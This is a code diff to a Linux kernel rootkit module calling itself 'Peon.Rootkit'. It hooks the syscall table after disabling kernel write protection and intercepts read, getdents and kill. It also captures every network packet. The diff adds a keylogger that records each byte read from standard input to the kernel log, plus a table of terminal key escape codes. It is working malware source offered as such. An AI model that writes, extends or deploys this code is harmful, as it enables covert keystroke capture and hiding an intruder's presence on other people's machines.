@@ -5,6 +5,8 @@
 #include <linux/cred.h>
 #include <linux/dirent.h>
 #include <linux/string.h>
+#include <linux/file.h>
+#include <linux/sched.h>
 #include <linux/skbuff.h>
 #include <linux/netdevice.h>
 #include <linux/in.h>
@@ -14,9 +16,13 @@
 #include <linux/socket.h>
 #include <linux/inet.h>
 #include <linux/limits.h>
+#include <linux/proc_fs.h>
 #include <asm/processor.h>
 #include <asm/uaccess.h>
 #include <asm/unistd.h>
+#include <asm/uaccess.h>
+#include <asm/errno.h>
+#include <asm/io.h>
 
 
 #define HOOK_READ
@@ -29,12 +35,11 @@
 #define ETH_P_ALL       0x0003
 
 #if defined(__LP64__) || defined(_LP64) //__x86_64 /* 64 bits machine */
-#define OS_64_BITS 1
+#define OS_64_BITS
 #define KERN_MEM_BEGIN 0xffffffff81000000
 #define KERN_MEM_END 0xffffffff81e42000
 
 #else	/* 32 bits machine */
-#define OS_64_BITS 0
 #define KERN_MEM_BEGIN 0xc0000000	//11000000 00000000 00000000 00000000
 #define KERN_MEM_END 0xd0000000		//11010000 00000000 00000000 00000000
 #endif 
@@ -76,7 +81,7 @@ unsigned long **find_syscall_table(void)
 
 void disable_wp(void){
 
-#if defined(__LP64__) || defined(_LP64) 
+#if defined(OS_64_BITS) 
 
 	__asm__("push   %rax\n\t"
 		"mov    %cr0,%rax;\n\t"
@@ -99,7 +104,7 @@ void disable_wp(void){
 
 void enable_wp(void){
 
-#if defined(__LP64__) || defined(_LP64) 
+#if defined(OS_64_BITS) 
 
 	__asm__("push   %rax\n\t"
 		"mov    %cr0,%rax;\n\t"
@@ -127,29 +132,107 @@ void enable_wp(void){
 unsigned long ** syscall_table ;
 
 char FIRST_SHOW_MODULE = 1;
+
+char keys[5]={0};
 /* save packet type */
 struct packet_type pt;
 
 /* save module */
 struct module *mod;
 
+
+/*
+Three byte keys:
+#################
+
+UpArrow:     0x1B 0x5B 0X41
+DownArrow:   0x1B 0x5B 0X42
+RightArrow:  0x1B 0x5B 0x43
+LeftArrow:   0x1b 0x5B 0x44
+Beak(Pause): 0x1b 0x5B 0x50
+
+
+Four byte keys:
+################
+
+F1:          0x1b 0x5B 0x5B 0x41
+F2:          0x1b 0x5B 0x5B 0x42
+F3:          0x1b 0x5B 0x5B 0x43
+F4:          0x1b 0x5B 0x5B 0x44
+F5:          0x1b 0x5B 0x5B 0x45
+Ins:         0x1b 0x5B 0x32 0x7E
+Home:        0x1b 0x5B 0x31 0x7E
+PgUp:        0x1b 0x5B 0x35 0x7E
+Del:         0x1b 0x5B 0x33 0x7E
+End:         0x1b 0x5B 0x34 0x7E
+PgDn:        0x1b 0x5B 0x36 0x7E
+
+
+Five byte keys:
+################
+
+F6:          0x1b 0x5B 0x31 0x37 0x7E
+F7:          0x1b 0x5B 0x31 0x38 0x7E
+F8:          0x1b 0x5B 0x31 0x39 0x7E
+F9:          0x1b 0x5B 0x32 0x30 0x7E
+F10:         0x1b 0x5B 0x32 0x31 0x7E
+F11:         0x1b 0x5B 0x32 0x33 0x7E
+F12:         0x1b 0x5B 0x32 0x34 0x7E
+*/
+
+void check_keyboard_buf(char __user *buf){
+	u16 index=0;
+	while(buf[index]!=0x00 && index<50){
+		if (buf[index]==0x9)
+			printk(KERN_ALERT "Peon.Rootkit: keyboard = {TAB}");
+		else if (buf[index]==0x7f)
+			printk(KERN_ALERT "Peon.Rootkit: keyboard = {BACKSPACE}");
+		else if (buf[index]==0x0d)
+			printk(KERN_ALERT "Peon.Rootkit: keyboard = {ENTER}");
+		else if (buf[index]==0x0a)
+			printk(KERN_ALERT "Peon.Rootkit: keyboard = {NewLine}");
+/*		else if (buf[index]==0x1b){
+			keys[0]=buf[index];
+			key_saved_index=1;
+		}
+		else if (buf[index]==0x5b){
+			keys[key_saved_index]=buf[index];
+			key_saved_index++;
+		}
+		else if (buf[index]==0x41 || buf[index]==0x42 || buf[index]==0x43 ||buf[index]==0x44 ||buf[index]==0x45 ||){
+			keys[key_saved_index]=buf[index];
+			key_saved_index++;
+		}*/
+
+
+		else
+			printk(KERN_ALERT "Peon.Rootkit: keyboard[%d] = %c, %02X\n",index,buf[index],buf[index]);
+		index++;
+			}
+
+
+}
+
+
+
+
+
 #ifdef HOOK_READ
 	asmlinkage long (*orig_read_call) (unsigned int fd, char __user *buf, size_t count); 
 	asmlinkage long hook_read_call(unsigned int fd,char __user *buf, size_t count){
-/*
+
 		long ret = orig_read_call( fd, buf, count);
 		if (fd==0){
-			//printk(KERN_ALERT "Peon.Rootkit: keyboard %s",(char*)buf);
-			//printk(KERN_ALERT "Peon.Rootkit: keyboard[0] = %c \n",((char*)buf)[0]);
+
+		check_keyboard_buf(buf);
+
 		}
 		return  ret;
-*/
-		return  orig_read_call( fd, buf, count);
 	} 
 #endif
 
 
-#if defined(__LP64__) || defined(_LP64) 
+#if defined(OS_64_BITS) 
 /* -------------------------- 64 bits getdents version ------------------------------------------ */
 asmlinkage long (*orig_getdents) (unsigned int fd,  struct linux_dirent __user *dirent,  unsigned int count);
 asmlinkage long hacked_getdents(unsigned int fd,  struct linux_dirent __user *dirent, unsigned int count){
@@ -258,7 +341,7 @@ asmlinkage long kill_hook_call( pid_t pid, int sig){
 
 /* -------------------------------------------------------------------- */
 
-int toto(struct sk_buff *skb, struct net_device *dev, struct packet_type *pkt,struct net_device *dev2)
+int dev_func(struct sk_buff *skb, struct net_device *dev, struct packet_type *pkt,struct net_device *dev2)
 {
 	kfree_skb(skb);
 	#ifdef DEBUG
@@ -294,15 +377,9 @@ int init_module(void)
 
 	/*  Replace the syscall in the table */
 	syscall_table[__NR_kill] = (void*) kill_hook_call;
-#ifdef HOOK_READ
-	/*  Save the adress of the original read syscall */
-	orig_read_call= (void *) syscall_table[__NR_read];
 
-	/*  Replace the syscall in the table */
-	syscall_table[__NR_read] = (void*) hook_read_call;
-#endif
 
-#if defined(__LP64__) || defined(_LP64) 
+#if defined(OS_64_BITS) 
 
 	#ifdef DEBUG	
 	printk(KERN_INFO "Peon.Rootkit is in 64 bits\n");
@@ -326,18 +403,26 @@ int init_module(void)
 
 #endif
 
-	#ifdef NETWORK
+#ifdef NETWORK
 	//remove interfacepacket layer2
 	__dev_remove_pack( &pt ); 
 	// stuff for network, call toto function  
 	pt.type = htons(ETH_P_ALL);
 	// pt.dev = 0;
-	pt.func = toto;
+	pt.func = dev_func;
 	dev_add_pack(&pt);
-	#ifdef DEBUG
-	printk(KERN_INFO "Peon.Rootkit is loaded our Network device!\n");
-	#endif
-	#endif
+		#ifdef DEBUG
+		printk(KERN_INFO "Peon.Rootkit is loaded our Network device!\n");
+		#endif
+#endif
+
+#ifdef HOOK_READ
+	/*  Save the adress of the original read syscall */
+	orig_read_call= (void *) syscall_table[__NR_read];
+
+	/*  Replace the syscall in the table */
+	syscall_table[__NR_read] = (void*) hook_read_call;
+#endif
 
 	enable_wp(); 
 	
@@ -360,7 +445,7 @@ void cleanup_module(void)
 	syscall_table[ __NR_read ] = (void*) orig_read_call;
 	#endif
 
-	#if defined(__LP64__) || defined(_LP64)  
+	#if defined(OS_64_BITS)  
 		syscall_table[ __NR_getdents] = (void*) orig_getdents;
 	#else
 		syscall_table[ __NR_getdents64] = (void*) orig_getdents64;
